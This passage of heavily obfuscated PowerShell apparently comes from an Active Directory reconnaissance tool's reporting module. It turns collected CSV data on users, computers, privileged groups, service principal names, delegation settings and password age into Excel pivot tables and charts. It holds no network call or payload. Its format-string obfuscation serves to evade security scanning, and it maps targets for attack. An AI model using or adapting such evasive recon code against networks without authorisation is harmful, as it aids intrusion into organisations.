            &("{4}{2}{0}{1}{3}" -f'el','S','c','ort','Get-ADREx') -ColumnName ("{0}{1}"-f'U','serName')
        }

        ${AD`FIl`eN`Ame} = -join(${r`e`pO`RTPATh},'\',("{1}{2}{0}{3}"-f 'p','Co','m','uters.csv'))
        If (&("{0}{2}{1}"-f 'T','ath','est-P') ${a`d`FI`LeNAMe})
        {
            &("{0}{3}{2}{1}{4}"-f'Ge','ExcelWor','ADR','t-','kbook') -Name ("{1}{2}{0}"-f'ters','Co','mpu')
            &("{0}{4}{3}{1}{2}{5}"-f 'G','R','ExcelI','-AD','et','mport') -ADFileName ${ad`Fi`lENamE}
            &("{3}{2}{0}{1}"-f 'a','ble','ove-Vari','Rem') ("{1}{0}{2}"-f'D','A','FileName')

            &("{4}{2}{0}{1}{3}" -f'xcel','So','RE','rt','Get-AD') -ColumnName ("{0}{1}{2}"-f'Us','erNam','e')

            ${wOR`KsH`EEt} = ${wo`RKb`ooK}."wORK`s`HeETs".("{0}{1}" -f'It','em').Invoke(1)
            
            ${wO`RkShE`eT}.("{0}{1}"-f 'Sele','ct').Invoke()
            ${w`Or`ksHEET}."AP`PLi`CAtioN"."A`cTIVeW`INDoW"."S`plI`Tco`luMN" = 1
            ${w`Or`k`shEeT}."appL`ic`ATI`On"."actIV`e`WinDOw"."S`pl`ITRow" = 1
            ${wORkS`H`E`eT}."aPp`LIca`Ti`On"."ACtI`Ve`wind`oW"."freeZ`e`panes" = ${t`RUE}

            &("{1}{4}{2}{3}{0}" -f'ease','Get-ADRE','Co','mObjRel','xcel') -ComObjtoRelease ${W`o`RK`shEET}
            &("{1}{3}{2}{0}"-f 'e','Re','ariabl','move-V') ("{0}{2}{1}" -f 'wor','sheet','k')
        }

        ${a`dfilE`NAme} = -join(${r`EPOr`TPath},'\',("{0}{2}{1}"-f'O','sv','Us.c'))
        If (&("{1}{0}{2}"-f 't-','Tes','Path') ${aDfI`L`e`Name})
        {
            &("{4}{0}{1}{2}{3}"-f '-ADR','Excel','Workboo','k','Get') -Name "OUs"
            &("{3}{0}{2}{1}" -f'ADRE','mport','xcelI','Get-') -ADFileName ${ADf`I`L`EnAme}
            &("{2}{3}{0}{1}"-f '-V','ariable','Re','move') ("{1}{0}{2}" -f 'Na','ADFile','me')
        }

        ${Adf`iL`EN`AmE} = -join(${r`Ep`Or`TPatH},'\',("{0}{1}{2}" -f'Gro','ups.cs','v'))
        If (&("{1}{2}{0}" -f 'ath','Test','-P') ${ADFIl`eN`AMe})
        {
            &("{3}{1}{5}{4}{0}{2}" -f 'orkbo','et','ok','G','RExcelW','-AD') -Name ("{0}{1}"-f 'Gro','ups')
            &("{2}{1}{3}{0}"-f 'rt','et-A','G','DRExcelImpo') -ADFileName ${ADfIL`En`A`me}
            &("{4}{1}{3}{2}{0}"-f 'ble','e','ria','move-Va','R') ("{0}{2}{1}"-f 'AD','eName','Fil')

            &("{1}{0}{2}{3}" -f'et-ADREx','G','cel','Sort') -ColumnName ("{3}{1}{0}{2}{4}" -f 's','ngui','hed','Disti','Name')
        }

        ${Ad`FILena`mE} = -join(${re`p`o`RtPATH},'\',("{3}{1}{2}{0}"-f 'sv','upMember','s.c','Gro'))
        If (&("{2}{0}{1}" -f 'st-Pat','h','Te') ${a`DFIL`EnaMe})
        {
            &("{1}{0}{2}{3}{4}" -f 'ADRExce','Get-','lWor','k','book') -Name ("{1}{0}{3}{2}"-f'oup M','Gr','s','ember')
            &("{5}{3}{1}{4}{2}{0}"-f'port','e','m','et-ADRExc','lI','G') -ADFileName ${AdFI`LE`NAme}
            &("{3}{2}{0}{1}" -f 'riab','le','Va','Remove-') ("{1}{0}{2}" -f'ileNa','ADF','me')

            &("{2}{0}{3}{1}"-f 't-ADREx','rt','Ge','celSo') -ColumnName ("{2}{1}{0}" -f 'Name','up ','Gro')
        }

        ${adf`I`lEname} = -join(${REpOr`TpA`Th},'\',("{2}{1}{0}" -f'v','SPNs.cs','User'))
        If (&("{1}{0}{2}"-f 't-','Tes','Path') ${AD`FIlen`A`me})
        {
            &("{3}{1}{0}{2}"-f'boo','Work','k','Get-ADRExcel') -Name ("{1}{2}{0}"-f 'Ns','User',' SP')
            &("{2}{4}{1}{3}{0}" -f'port','x','G','celIm','et-ADRE') -ADFileName ${adf`Il`Ename}
            &("{1}{2}{0}{3}{4}"-f 'ove-Va','Re','m','ria','ble') ("{0}{1}{2}" -f 'AD','File','Name')
        }

        ${aD`FiL`EnA`mE} = -join(${rEP`o`Rt`PAtH},'\',("{2}{1}{0}" -f's.csv','ser','U'))
        If (&("{2}{0}{1}" -f 'est','-Path','T') ${ad`FIl`EnaME})
        {
            &("{3}{5}{2}{4}{0}{1}" -f'rkboo','k','RExcel','Ge','Wo','t-AD') -Name ("{0}{1}"-f'U','sers')
            &("{3}{1}{2}{0}" -f 't','l','Impor','Get-ADRExce') -ADFileName ${Ad`FI`Le`Name}
            &("{2}{0}{3}{4}{1}"-f'emov','iable','R','e-','Var') ("{0}{2}{1}"-f'ADFi','Name','le')

            &("{2}{0}{1}{3}" -f'et-ADRExcelS','o','G','rt') -ColumnName ("{0}{1}{2}" -f'UserNa','m','e')

            ${w`oR`KsHE`ET} = ${wo`R`kbOok}."wORk`SHEe`TS".("{1}{0}" -f 'm','Ite').Invoke(1)

            
            ${WOR`k`sHEeT}.("{1}{0}"-f 'ect','Sel').Invoke()
            ${W`ORKsh`EeT}."AP`pli`cAtION"."ACTi`VE`wi`NDoW"."s`p`L`iTcOlumN" = 1
            ${wOR`ks`HEeT}."APPLiC`AT`Ion"."ACT`IVEWInd`oW"."SPL`itR`oW" = 1
            ${WO`R`k`sheEt}."appl`icA`TioN"."ActIV`ewiN`d`oW"."FRE`eZ`EPaNEs" = ${Tr`UE}

            ${Wor`k`Sheet}."C`elLS".("{0}{1}" -f'I','tem').Invoke(1,3)."i`NTEri`oR"."col`ORIn`dEx" = 5
            ${W`Ork`sH`Eet}."ce`LLs".("{1}{0}" -f 'm','Ite').Invoke(1,3)."f`oNt"."cOlor`I`NDeX" = 2
            
            ${w`orKSh`EEt}."Us`E`d`RAnge".("{0}{1}" -f 'S','elect').Invoke() | &("{1}{0}{2}"-f 'ut-Nul','O','l')
            ${eXc`EL}."sELe`c`TIOn".("{2}{0}{1}" -f 'i','lter','AutoF').Invoke(3,${Tr`UE}) | &("{0}{1}" -f 'Out-Nu','ll')
            ${w`oRk`SHEeT}."ce`LLS".("{1}{0}" -f 'tem','I').Invoke(1,1).("{1}{2}{0}"-f 'ct','Sel','e').Invoke() | &("{0}{2}{1}"-f 'Ou','ull','t-N')
            &("{0}{3}{4}{1}{2}" -f'G','ComOb','jRelease','et-A','DRExcel') -ComObjtoRelease ${WORk`s`Heet}
            &("{1}{0}{2}" -f 'move-','Re','Variable') ("{2}{1}{0}" -f 't','shee','work')
        }

        
        ${AD`FiLEN`Ame} = -join(${RE`PoR`T`Path},'\',("{0}{2}{3}{1}" -f'Comp','.csv','ute','rSPNs'))
        If (&("{0}{1}{2}" -f'Tes','t','-Path') ${aDfI`leNa`Me})
        {
            &("{3}{1}{4}{0}{2}" -f 'bo','lWor','ok','Get-ADRExce','k') -Name ("{0}{1}{2}{3}" -f 'Co','m','puter Role Sta','ts')
            &("{3}{1}{2}{0}"-f'e','Vari','abl','Remove-') ("{0}{1}{2}"-f'ADFi','leNa','me')

            ${wOr`KS`He`et} = ${w`orkb`ooK}."wOr`Ksh`EEtS".("{1}{0}" -f'tem','I').Invoke(1)
            ${pi`Vo`TtAbl`eNAmE} = ("{1}{2}{0}" -f ' SPNs','Comput','er')
            &("{2}{0}{3}{5}{1}{4}" -f '-A','iv','Get','DRE','otTable','xcelP') -SrcSheetName ("{2}{3}{0}{1}"-f 'r S','PNs','Compu','te') -PivotTableName ${pIvoT`TAbL`E`Na`me} -PivotRows @(("{2}{1}{0}" -f 'ice','rv','Se')) -PivotValues @(("{2}{1}{0}" -f'e','ic','Serv'))

            ${WO`RkSH`e`eT}."Cel`LS".("{1}{0}"-f'em','It').Invoke(1,1) = ("{3}{2}{0}{1}"-f'Rol','e','er ','Comput')
            ${WoRk`s`hEet}."C`ElLs".("{0}{1}"-f 'Ite','m').Invoke(1,2) = ("{1}{0}" -f 'unt','Co')

            
            ${WorKS`hE`Et}.("{1}{2}{0}" -f'es','Pi','votTabl').Invoke(${pIv`OtTa`Blen`A`ME}).("{1}{2}{0}"-f'tFields','Piv','o').Invoke(("{2}{1}{0}" -f'e','c','Servi'))."aUtoS`OrT"(  (gEt-vArIAble aNBZ -VALueOn )::"XLd`e`SCenDIng",("{0}{1}"-f'Coun','t'))

            &("{0}{4}{3}{5}{1}{2}" -f'Ge','xcelChar','t','A','t-','DRE') -ChartType ("{0}{1}{3}{2}"-f'x','lColumnCl','ed','uster') -ChartLayout 10 -ChartTitle ("{4}{2}{0}{1}{3}{5}"-f ' R','o','omputer','l','C','es in AD') -RangetoCover ("{1}{0}" -f ':U16','D2')
            ${w`oR`KboOK}."wOR`k`SHeEtS".("{1}{0}" -f 'm','Ite').Invoke(1)."Hy`PeRli`Nks".("{1}{0}"-f 'd','Ad').Invoke(${worK`Bo`oK}."WoRk`sH`EeTs".("{0}{1}" -f'I','tem').Invoke(1)."C`Ells".("{1}{0}" -f'tem','I').Invoke(1,4) , "" , ((("{0}{1}{2}{3}{4}" -f'kP0Co','mputer SPN','skP0!','A','1'))."rE`pLaCe"(([CHAR]107+[CHAR]80+[CHAR]48),[strING][CHAR]39)), "", ("{1}{2}{0}"-f'a','Ra','w Dat')) | &("{1}{2}{0}"-f 'll','Out-','Nu')
            ${E`X`CEl}."w`indo`ws".("{0}{1}" -f'It','em').Invoke(1)."dISPlayGR`IDL`I`NES" = ${f`ALSE}
            &("{2}{1}{0}" -f 'ble','Varia','Remove-') ("{1}{0}{2}"-f 'votT','Pi','ableName')

            &("{5}{1}{4}{6}{0}{3}{7}{2}" -f 'm','t-A','se','Obj','DRExcel','Ge','Co','Relea') -ComObjtoRelease ${wo`R`ksh`eeT}
            &("{1}{0}{2}{3}"-f'e','Remov','-Variab','le') ("{2}{1}{0}" -f 't','orkshee','w')
        }

        
        ${AdFIL`e`NaME} = -join(${rE`poRt`Pa`Th},'\',("{0}{1}{3}{2}"-f 'C','ompute','v','rs.cs'))
        If (&("{2}{1}{0}"-f 'ath','P','Test-') ${a`Df`ILENAMe})
        {
            &("{1}{0}{2}{4}{3}"-f 'RE','Get-AD','xcel','kbook','Wor') -Name ("{4}{0}{5}{3}{1}{2}"-f'perati','stem Sta','ts','Sy','O','ng ')
            &("{0}{3}{2}{1}"-f 'Remov','riable','-Va','e') ("{1}{0}{2}" -f'leN','ADFi','ame')

            ${Wo`RKs`HE`ET} = ${Wor`KBOOK}."W`O`RkSheets".("{0}{1}" -f 'Ite','m').Invoke(1)
            ${PIv`oTT`Abl`EnaME} = ("{1}{3}{0}{4}{2}"-f 'rating','Op','ms','e',' Syste')
            &("{0}{2}{1}{5}{4}{3}" -f'Get','DRExc','-A','PivotTable','l','e') -SrcSheetName ("{0}{3}{1}{2}" -f 'C','mpute','rs','o') -PivotTableName ${piv`Ot`T`ABlena`me} -PivotRows @(("{2}{1}{3}{4}{0}" -f'm','r','Ope','ating Syst','e')) -PivotValues @(("{1}{0}{3}{2}" -f'ra','Ope','ystem','ting S'))

            ${W`oR`KsHEet}."cEL`ls".("{1}{0}"-f 'tem','I').Invoke(1,1) = ("{2}{0}{1}{3}" -f'pera','ting S','O','ystem')
            ${wor`ks`HeEt}."c`ELls".("{1}{0}" -f'em','It').Invoke(1,2) = ("{0}{1}"-f'Coun','t')

            
            ${w`orKSh`eEt}.("{0}{1}{2}" -f 'P','ivotTab','les').Invoke(${piV`OTTAbL`e`NAMe}).("{1}{0}{2}"-f'votFi','Pi','elds').Invoke(("{0}{2}{3}{1}" -f 'Op','ng System','er','ati'))."aUT`oS`ort"(  $anbZ::"Xl`DESC`eN`DInG",("{0}{1}" -f 'Cou','nt'))

            &("{3}{2}{0}{1}"-f 'xc','elChart','-ADRE','Get') -ChartType ("{1}{2}{0}{3}" -f 'nCl','xlC','olum','ustered') -ChartLayout 10 -ChartTitle ("{4}{2}{6}{3}{1}{0}{5}"-f 'i',' ','er','g Systems','Op','n AD','atin') -RangetoCover ("{1}{0}"-f'6','D2:S1')
            ${wo`R`KBook}."wO`RKs`heETs".("{0}{1}"-f 'I','tem').Invoke(1)."hYPE`Rli`Nks".("{0}{1}" -f'A','dd').Invoke(${w`orK`BOoK}."WORkShE`e`Ts".("{1}{0}" -f'm','Ite').Invoke(1)."c`eLLS".("{1}{0}"-f 'm','Ite').Invoke(1,4) , "" , ("{2}{0}{3}{1}" -f'ompu','ers!A1','C','t'), "", ("{0}{2}{1}"-f'Ra','ata','w D')) | &("{1}{0}" -f'Null','Out-')
            ${eX`Cel}."W`iN`dOWs".("{1}{0}" -f 'tem','I').Invoke(1)."di`spLaYGrI`DLI`N`ES" = ${f`AlSE}
            &("{4}{3}{2}{1}{0}" -f 'e','l','ariab','move-V','Re') ("{2}{3}{1}{4}{0}"-f 'me','abl','Pi','votT','eNa')

            &("{2}{3}{1}{4}{0}" -f'mObjRelease','-ADREx','Ge','t','celCo') -ComObjtoRelease ${wOr`kS`HEeT}
            &("{4}{3}{1}{2}{0}"-f'iable','V','ar','-','Remove') ("{1}{0}"-f't','workshee')
        }

        
        ${ADFIle`Na`ME} = -join(${rE`PORTP`ATh},'\',("{2}{3}{0}{1}{4}" -f 'r','s.c','Gro','upMembe','sv'))
        If (&("{2}{0}{1}" -f't-Pat','h','Tes') ${aDf`ILe`N`AME})
        {
            &("{4}{3}{2}{1}{0}"-f 'orkbook','lW','xce','-ADRE','Get') -Name ("{2}{0}{1}{4}{3}"-f'ege','d G','Privil','ats','roup St')
            &("{1}{0}{2}" -f 'o','Rem','ve-Variable') ("{1}{2}{0}" -f 'Name','AD','File')

            ${wo`R`kS`Heet} = ${WorK`B`O`Ok}."WOrKS`He`eTS".("{0}{1}"-f'I','tem').Invoke(1)
            ${piVoTtA`BLe`N`AMe} = ("{2}{0}{1}" -f ' Member','s','Group')
            &("{0}{1}{2}{3}"-f 'Get-AD','RExc','elPivotTa','ble') -SrcSheetName ("{2}{3}{1}{0}" -f 's','up Member','Gr','o') -PivotTableName ${PIv`OtT`A`BlEn`AMe} -PivotRows @(("{1}{0}{2}"-f'ou','Gr','p Name'))-PivotFilters @(("{0}{2}{1}"-f 'Acc','e','ountTyp')) -PivotValues @(("{0}{1}{2}"-f 'Ac','countTy','pe'))

            
            ${WOR`KShE`et}.("{2}{1}{0}" -f'es','tTabl','Pivo').Invoke(${p`IVotTAB`len`A`Me}).("{1}{3}{0}{2}" -f 'Fi','Piv','elds','ot').Invoke(("{2}{0}{1}{3}" -f 'c','ount','Ac','Type'))."cUr`Re`NTpA`Ge" = ("{0}{1}" -f 'use','r')

            ${wOr`Ks`hEet}."Ce`LLs".("{1}{0}"-f'm','Ite').Invoke(1,2)."i`N`TEriOr"."cOl`or`inDEX" = 5
            ${w`ORkS`He`eT}."CE`lls".("{1}{0}"-f 'em','It').Invoke(1,2)."F`ONt"."cOL`OR`iNdeX" = 2

            ${Wo`Rk`SHeEt}."cE`LLs".("{0}{1}"-f'I','tem').Invoke(3,1) = ("{0}{1}{2}{3}"-f 'G','rou','p Nam','e')
            ${W`o`RkS`HEEt}."cE`LLS".("{0}{1}"-f'Ite','m').Invoke(3,2) = (("{0}{2}{5}{3}{4}{1}" -f 'C','ive)','ou','ot-','Recurs','nt (N'))

            ${eX`Cel}."scReeNU`pd`ATING" = ${fa`l`SE}
            
            ${pIvO`Tta`Bl`EtEmP} = (${WorK`BO`oK}.("{0}{1}{2}{3}"-f'P','ivot','Ca','ches').Invoke().("{1}{0}" -f'm','Ite').Invoke(${WOrkb`o`Ok}.("{2}{1}{0}" -f'tCaches','o','Piv').Invoke()."cO`UnT")).("{3}{2}{0}{4}{1}"-f'Pivo','ble','reate','C','tTa').Invoke(("{1}{0}" -f '1C5','R'),("{0}{1}{2}" -f 'Pivot','Tabl','eTemp'))
            ${pIvo`TF`IEld`Temp} = ${PivO`TTABl`E`Te`Mp}.("{0}{1}{3}{2}" -f'Pivo','t','ds','Fiel').Invoke(("{0}{2}{1}"-f 'G','oup Name','r'))
            
            ${piVoTFi`EL`dtEMp}."OrieNt`A`TIon" =   ( geT-IteM  VAriable:7ybGk ).VAlUE::"X`lpAg`eF`iElD"
            Try
            {
                ${PIvOTf`I`ELdt`eMp}."curr`eNTPA`Ge" = ("{3}{2}{0}{1}" -f'dmi','ns','A','Domain ')
            }
            Catch
            {
                
                ${NO`DA} = ${T`RuE}
            }
            If (${n`ODa})
            {
                Try
                {
                    ${pIvo`TfIe`ldt`EMP}."cuRrENT`P`AGe" = ("{3}{1}{2}{0}" -f'rs','inistra','to','Adm')
                }
                Catch
                {
                    
                }
            }
            
            ${pIvo`TSL`i`cEr} = ${wOr`K`BoOk}."s`lice`Rca`Ches".("{0}{1}"-f'Ad','d').Invoke(${PI`V`OtTABLEt`emP},${pIV`oTFIe`ldt`e`Mp})
            
            ${p`I`VO`TSlIcer}."pIv`O`TtabLes".("{0}{1}{2}" -f'AddPivo','tTabl','e').Invoke(${w`ORk`sHe`eT}.("{2}{1}{0}"-f 'es','bl','PivotTa').Invoke(${PIvoTtA`Bl`eNaME}))
            
            ${PIvoT`S`Lic`Er}.("{2}{0}{1}"-f'le','te','De').Invoke()
            
            ${PIvOtTA`B`L`etEmp}."t`ABleRA`Ng`E2".("{1}{0}" -f'lete','De').Invoke() | &("{0}{2}{1}" -f'Out','l','-Nul')

            &("{6}{1}{5}{3}{4}{2}{0}" -f 'Release','et-','Obj','xce','lCom','ADRE','G') -ComObjtoRelease ${pI`VOTfIeLd`TEmp}
            &("{3}{4}{0}{1}{5}{2}" -f 'lComO','bjRele','e','Get-ADREx','ce','as') -ComObjtoRelease ${pI`V`OtsLIceR}
            &("{1}{0}{2}{3}{4}{5}"-f't-ADREx','Ge','ce','lCo','mObjRele','ase') -ComObjtoRelease ${pi`VO`T`TAb`leTEMp}

            &("{1}{3}{4}{0}{2}"-f 'ia','Rem','ble','ove','-Var') ("{0}{3}{1}{4}{2}" -f 'Piv','ield','mp','otF','Te')
            &("{1}{0}{2}"-f'move-Variabl','Re','e') ("{2}{0}{1}" -f'votSli','cer','Pi')
            &("{0}{3}{2}{1}"-f'Remo','ble','aria','ve-V') ("{1}{0}{2}{3}"-f'tT','Pivo','able','Temp')

            ("{1}{2}{3}{0}" -f'rs','A','ccount Operat','o'),("{1}{0}{2}"-f'a','Administr','tors'),("{1}{3}{4}{0}{2}" -f' Operator','Bac','s','k','up'),("{0}{1}{4}{2}{3}"-f 'C','er',' Publish','ers','t'),("{0}{4}{2}{1}{3}"-f'Cr',' Oper','to','ators','yp'),("{2}{0}{1}"-f 'n','sAdmins','D'),("{1}{0}{3}{2}{4}" -f 'oma','D',' Admi','in','ns'),("{4}{3}{1}{2}{0}"-f's','s','e Admin','pri','Enter'),("{6}{4}{1}{5}{0}{2}{3}" -f 'A','e K','dmin','s','rpris','ey ','Ente'),("{7}{8}{2}{1}{6}{5}{3}{4}{0}" -f'rs','e','ng For','i','lde','Trust Bu','st ','I','ncomi'),("{0}{2}{1}"-f 'K','y Admins','e'),("{10}{0}{4}{1}{3}{8}{6}{5}{9}{2}{7}"-f 'croso',' Ad','tor','vanced T','ft','ni','t Analytics Admi','s','hrea','stra','Mi'),("{0}{3}{1}{2}"-f 'Netwo','r','s','rk Operato'),("{1}{3}{2}{0}{4}" -f 'rator','Pr','t Ope','in','s'),("{1}{0}{2}" -f 'ed ','Protect','Users'),("{3}{2}{0}{1}"-f'e Desktop U','sers','t','Remo'),("{3}{0}{2}{1}" -f 'A','ins','dm','Schema '),("{2}{4}{3}{0}{1}"-f 'perator','s','Serv','r O','e') | &("{1}{2}{0}" -f 'ect','Fo','rEach-Obj') {
                Try
                {
                    ${wORK`S`hE`eT}.("{1}{0}{2}{3}"-f'iv','P','otTa','bles').Invoke(${pIVOtT`A`BLEn`Ame}).("{1}{0}{2}"-f 'd','PivotFiel','s').Invoke(("{2}{0}{1}" -f'roup',' Name','G')).("{1}{2}{0}{3}"-f 'otI','P','iv','tems').Invoke(${_})."v`ISIB`Le" = ${T`RUe}
                }
                Catch
                {
                    
                }
            }

            
            ${W`or`KsHEeT}.("{1}{2}{3}{0}" -f's','P','ivo','tTable').Invoke(${pi`VO`TtABLENamE}).("{0}{3}{2}{1}"-f 'P','s','ld','ivotFie').Invoke(("{1}{2}{0}"-f 'ame','Group ','N'))."auT`osOrt"( $aNBZ::"X`lDes`CENdI`Ng",(("{2}{1}{3}{0}"-f'ive)','ount (Not-Recur','C','s')))

            ${wo`RkS`h`eeT}."CE`lLS".("{0}{1}" -f 'It','em').Invoke(3,1)."iN`TE`Rior"."coL`O`RInd`ex" = 5
            ${WOR`ks`HEET}."cE`Lls".("{1}{0}"-f'tem','I').Invoke(3,1)."f`ONT"."CoL`OR`iN`DeX" = 2

            ${eXC`el}."SC`R`E`EnUpd`ATing" = ${T`RUE}

            &("{1}{0}{3}{2}" -f'et','G','ExcelChart','-ADR') -ChartType ("{2}{1}{3}{0}"-f 'd','lColumnCluster','x','e') -ChartLayout 10 -ChartTitle ("{5}{3}{4}{0}{2}{1}" -f ' Groups ',' AD','in','le','ged','Privi') -RangetoCover ("{0}{1}"-f 'D','2:P16') -StartRow "A3" -StartColumn "B3"
            ${WO`RKBo`OK}."W`O`RKs`heeTS".("{1}{0}" -f'm','Ite').Invoke(1)."hY`PeRlIn`Ks".("{1}{0}" -f'd','Ad').Invoke(${wO`RKbo`oK}."w`OrKSheE`Ts".("{0}{1}" -f'Ite','m').Invoke(1)."Ce`LLS".("{1}{0}" -f 'tem','I').Invoke(1,4) , "" , ((("{2}{0}{4}{1}{3}{5}"-f ' M','ers','vQPGroup','v','emb','QP!A1'))."r`EPL`ACE"('vQP',[STrinG][ChAR]39)), "", ("{0}{1}" -f 'Ra','w Data')) | &("{0}{2}{1}"-f 'Out-Nu','l','l')
            ${e`xC`EL}."WI`NDOWS".("{1}{0}" -f'm','Ite').Invoke(1)."DIs`PLaYGR`I`dLIN`Es" = ${fa`l`Se}

            &("{5}{6}{1}{3}{0}{4}{2}" -f 'Re','ComOb','ase','j','le','Get-ADR','Excel') -ComObjtoRelease ${WO`RkS`HE`eT}
            &("{4}{0}{3}{1}{2}" -f'v','-Variab','le','e','Remo') ("{1}{0}{3}{2}" -f'rk','wo','t','shee')
        }

        
        ${a`d`FiLeNaME} = -join(${RepOr`Tp`A`Th},'\',("{1}{3}{2}{0}" -f'rs.csv','Com','e','put'))
        If (&("{2}{1}{0}"-f '-Path','t','Tes') ${a`dfIL`Ena`ME})
        {
            &("{1}{0}{2}{3}" -f't-AD','Ge','RExcelW','orkbook') -Name ("{0}{4}{3}{1}{2}" -f'C',' S','tats','mputer','o')
            &("{4}{1}{0}{2}{3}"-f 'a','e-V','riabl','e','Remov') ("{1}{0}{2}"-f 'm','ADFileNa','e')

            ${oB`J`AtTRi`ButeS} = &("{1}{0}{2}" -f'jec','New-Ob','t') ("{1}{4}{3}{8}{5}{6}{7}{0}{2}"-f'on','Sy','ary','tem.C','s','ized.Ord','eredDict','i','ollections.Special')
            ${O`BJA`TTrI`BUTes}.("{1}{0}"-f 'dd','A').Invoke(("{4}{1}{3}{2}{0}" -f 'p','l','y','egation T','De'),((("{1}{2}{3}{0}" -f'IQ','WIQU','n','constrainedW')) -replAcE([cHAR]87+[cHAR]73+[cHAR]81),[cHAR]34))
            ${OBjaTt`R`IBut`es}.("{1}{0}" -f 'dd','A').Invoke(("{0}{1}{3}{2}{4}"-f'De','legatio','T','n ','ype'),((("{1}{4}{0}{5}{3}{2}"-f'r','P','Db','inedP','DbConst','a'))  -ReplacE([Char]80+[Char]68+[Char]98),[Char]34))
            ${OBJAttr`iBU`T`eS}.("{0}{1}" -f'Ad','d').Invoke(("{0}{2}{1}"-f'S','ory','IDHist'),'"*"')
            ${oBj`ATTRIb`U`Tes}.("{1}{0}"-f 'dd','A').Invoke(("{0}{1}{2}" -f 'Dor','ma','nt'),((("{1}{2}{3}{0}"-f 'ZV','OZVTR','U','EO'))."rE`PL`ACe"('OZV',[StrING][char]34)))
            ${oBJA`T`Tr`IbutEs}.("{1}{0}" -f 'd','Ad').Invoke(((("{1}{4}{2}{3}{0}"-f'd Age (> ','Pas','wo','r','s'))),((("{0}{1}{2}" -f'{0}','T','RUE{0}'))-f [ChAr]34))
            ${ObjATTR`IB`U`TES}.("{0}{1}"-f 'Ad','d').Invoke(("{3}{0}{2}{1}" -f's-','eatorSid','ds-Cr','m'),'"*"')

            &("{0}{7}{1}{3}{5}{2}{4}{6}" -f'Ge','xce','eS','lAtt','ta','ribut','ts','t-ADRE') -SrcSheetName ("{1}{2}{3}{0}" -f 'rs','C','ompu','te') -Title1 ("{2}{5}{0}{4}{6}{3}{1}"-f 'Ac','D','Comp','s in A','coun','uter ','t') -PivotTableName ("{2}{4}{5}{0}{6}{1}{3}{7}"-f'c','ts St','Compute','atu','r ','Ac','oun','s') -PivotRows ("{2}{0}{1}" -f'able','d','En') -PivotValues ("{1}{0}"-f 'ame','UserN') -PivotPercentage ("{0}{1}{2}" -f'User','Nam','e') -Title2 ("{4}{2}{3}{1}{0}"-f 's','er Account',' of Comp','ut','Status') -ObjAttributes ${OB`J`ATtRi`B`UTES}
            &("{2}{3}{1}{0}"-f'Variable','-','Remo','ve') ("{0}{2}{1}"-f 'O','Attributes','bj')

            &("{2}{0}{3}{4}{1}{5}"-f'D','Ch','Get-A','REx','cel','art') -ChartType ("{0}{1}"-f 'x','lPie') -ChartLayout 3 -ChartTitle ("{1}{4}{6}{0}{3}{7}{2}{5}" -f 'u','Com','in','nt','puter Ac',' AD','co','s ') -RangetoCover ("{1}{2}{0}" -f'23','A11',':D') -ChartData ${WoRK`Bo`oK}."WO`RK`sHeETs".("{0}{1}" -f 'Ite','m').Invoke(1).("{1}{0}"-f'ange','R').Invoke(("{2}{1}{0}"-f 'A4,B3:B4',':','A3'))
            ${Wor`k`BooK}."wOrKs`H`eets".("{0}{1}" -f'It','em').Invoke(1)."H`YPER`lInKs".("{1}{0}"-f'd','Ad').Invoke(${W`oRK`BoOK}."wOrkSh`EE`Ts".("{1}{0}"-f 'em','It').Invoke(1)."cEl`LS".("{1}{0}" -f 'tem','I').Invoke(10,1) , "" , ("{2}{3}{1}{0}" -f'A1','rs!','Comput','e'), "", ("{1}{0}" -f 'ta','Raw Da')) | &("{0}{1}{2}" -f'O','u','t-Null')

            &("{2}{1}{0}{3}"-f'h','DRExcelC','Get-A','art') -ChartType ("{1}{0}{2}{3}"-f'C','xlBar','lu','stered') -ChartLayout 1 -ChartTitle ("{3}{4}{1}{2}{0}" -f'unts','Computer Acc','o','Status ','of ') -RangetoCover ("{0}{1}" -f 'F11:L2','3') -ChartData ${wor`kB`ook}."WoR`KSH`E`ETS".("{1}{0}"-f 'm','Ite').Invoke(1).("{0}{1}" -f'Ra','nge').Invoke(("{1}{2}{0}" -f'2:G8','F2:F','8,G'))
            ${WoR`kbOok}."wor`KSh`eETS".("{1}{0}" -f'em','It').Invoke(1)."HYPE`Rli`Nks".("{1}{0}"-f 'd','Ad').Invoke(${wo`R`k`BoOk}."w`OR`K`sHEets".("{0}{1}"-f'It','em').Invoke(1)."C`elLs".("{1}{0}" -f'tem','I').Invoke(10,6) , "" , ("{2}{1}{0}"-f'!A1','omputers','C'), "", ("{2}{0}{1}"-f 'w ','Data','Ra')) | &("{1}{0}{2}"-f 't-Nul','Ou','l')

            ${wor`k`BOOk}."Wo`RkS`HEEts".("{0}{1}"-f 'I','tem').Invoke(1)."uSe`drAnGE"."ent`IreCo`lUmn".("{0}{1}{2}" -f'Au','to','Fit').Invoke() | &("{2}{1}{0}"-f'l','-Nul','Out')
            ${ex`ceL}."w`INdo`ws".("{1}{0}" -f'm','Ite').Invoke(1)."d`ISpla`yGridLInEs" = ${f`Alse}
        }

        
        ${A`dfiL`EnaME} = -join(${rE`POR`TP`ATh},'\',("{2}{0}{1}" -f 'rs.c','sv','Use'))
        If (&("{1}{0}"-f 'h','Test-Pat') ${aDFil`e`NA`Me})
        {
            &("{2}{3}{0}{1}" -f 'ADRExcelW','orkbook','G','et-') -Name ("{0}{1}{3}{2}" -f 'U','s','ats','er St')
            &("{3}{1}{0}{2}{4}" -f 've-V','mo','ariabl','Re','e') ("{1}{2}{0}" -f'ame','A','DFileN')

            ${O`B`Jat`TRi`BUtES} = &("{1}{2}{0}"-f 'ct','New','-Obje') ("{8}{1}{9}{5}{6}{11}{3}{12}{0}{13}{2}{10}{7}{4}" -f 'e','m.Collections.S','D','.O','nary','cia','lize','ctio','Syste','pe','i','d','rd','red')
            ${O`BjaTt`Ri`Bu`TEs}.("{1}{0}"-f 'dd','A').Invoke(("{3}{2}{7}{1}{6}{5}{0}{4}{8}" -f 'at ','or','ust Change Pass','M','L',' ','d','w','ogon'),((("{1}{3}{2}{0}" -f'0k','8','TRUE8','0k')) -REPlAce  '80k',[CHAR]34))
            ${oBJatT`R`iBut`eS}.("{0}{1}" -f 'A','dd').Invoke(("{3}{1}{4}{2}{0}{5}" -f 's','nnot','nge Pa','Ca',' Cha','sword'),((("{1}{2}{0}"-f 'DY','vDY','TRUEv'))  -repLace([chAR]118+[chAR]68+[chAR]89),[chAR]34))
